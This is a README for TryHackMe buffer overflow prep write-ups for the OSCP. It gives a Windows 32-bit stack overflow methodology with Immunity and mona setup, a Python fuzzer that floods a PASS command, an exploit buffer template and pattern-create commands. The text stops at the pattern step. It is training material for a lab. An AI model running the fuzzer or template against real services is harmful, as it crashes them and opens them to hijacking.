# Buffer Overflow Prep from tryhackme.

This series of write-ups was to help me prep for a potential buffer overflow box for the revised OSCP exam.

Following the guide from [Tib3rius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst) (who also happens to be a co-author of this series.

This write-up containts the following machines, as well as a template for exploitation written bellow.

# Vulnerable Applications

- [The SLMail installer](/TryHackMe/Buffer_Overflow_Prep/slmail.md)

- [The brainpan binary](/TryHackMe/Buffer_Overflow_Prep/brainpan.md)

- [The dostackbufferoverflowgood binary](/TryHackMe/Buffer_Overflow_Prep/dostackbufferoverflowgood.md)

- [The vulnserver binary](/TryHackMe/Buffer_Overflow_Prep/vulnserver.md)

- [custom written "oscp" binary 1](/TryHackMe/Buffer_Overflow_Prep/1.md)

- [custom written "oscp" binary 2](/TryHackMe/Buffer_Overflow_Prep/2.md)

- [custom written "oscp" binary 3](/TryHackMe/Buffer_Overflow_Prep/3.md)

- [custom written "oscp" binary 4](/TryHackMe/Buffer_Overflow_Prep/4.md)

- [custom written "oscp" binary 5](/TryHackMe/Buffer_Overflow_Prep/5.md)

- [custom written "oscp" binary 6](/TryHackMe/Buffer_Overflow_Prep/6.md)

- [custom written "oscp" binary 7](/TryHackMe/Buffer_Overflow_Prep/7.md)

- [custom written "oscp" binary 8](/TryHackMe/Buffer_Overflow_Prep/8.md)

- [custom written "oscp" binary 9](/TryHackMe/Buffer_Overflow_Prep/9.md)

- [custom written "oscp" binary 10](/TryHackMe/Buffer_Overflow_Prep/10.md)

# BUFFER OVERFLOW METHODOLOGY.

[Tools](#tools-being-used)

[Fuzzing](#fuzzing)

[Crash Replication & Controlling EIP](#eip)

[Finding Bad Characters](#finding-bad-characters)

[Finding A Jump Point](#finding-a-jump-point)

[Generating a Payload](#generating-a-payload)

[Prepend NOP sled](#prepend-nop-sled)

[Final Buffer](#final-buffer)

A buffer overflow happens when the amount of data being placed into memory is greater than the buffer(or area) that was provided, causing the extra data to "overflow" into neighboring memory-space. This can allow an attacker to craft target specific data that can end up controlling the execution flow of the program, once they have broken free of the buffer prison. This is a template for discovering and exploiting buffer overflows on windows 32 bit systems.

## Tools being used

On the target system we will be using a debugger to view and pause the execution flow of the vulnerable applications, as well as search through system memory in order to craft our attack. The debugger being used in these examples is immunity debugger.

### IMMUNITY TIPS

- If at all possible, run as Administrator

- If target application is already running `File -> Attach`

- If target application is not running `File -> Open`

- If target application is a windows service may have to use `sc`

- To stop/start a windows service with sc `sc stop/start "service name"`

- `CTR F2` Restarts target application

- `F9` Runns the program (starts paused)

### MONA Configuration.

Mona is a powerful plugin for Immunity Debugger, written in python, that makes exploiting buffer overflows much easier.

- The latest version can be downloaded here: https://github.com/corelan/mona
- The manual can be found here: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
- Copy the mona.py file into the PyCommands directory of Immunity Debugger (usually located at C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands).
- In Immunity Debugger, type the following to set a working directory for mona.

```
!mona config -set workingfolder c:\mona\%p
```
## FUZZING

Fuzzing is the process of sending increasing lengths of data in order to crash the application, and then using a debugger to verify that EIP has been overwritten.

The sample python code below can be modified to automate that task. It will send the character A's `\x41` in hex).


### fuzz.py
```python
import socket, time, sys

ip = "10.0.0.1"
port = 21
timeout = 5

# Create an array of increasing length buffer strings.
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("USER username\r\n")
        s.recv(1024)

        print("Fuzzing PASS with %s bytes" % len(string))
        s.send("PASS " + string + "\r\n")
        s.recv(1024)
        s.send("QUIT\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

## EIP

First step is going to be to find the EIP register, here is a template for the actual expoit that can be modified to find and create the buffer overflow.

```python
import socket

ip = "10.0.0.1"
port = 21

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```


With the <length> of bytes that caused the crash add 400 to make sure there is enough space for your shellcode. The guide written for this has you using the metasploit module pattern_create, but since we are already using mona from within mona, there is no reason not to just do this step on the target.


From within immunity CLI

`!mona pc <length>`

-OR-

Using metasploit (one of the modules allowed for OSCP)

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>|xclip -selection clipboard


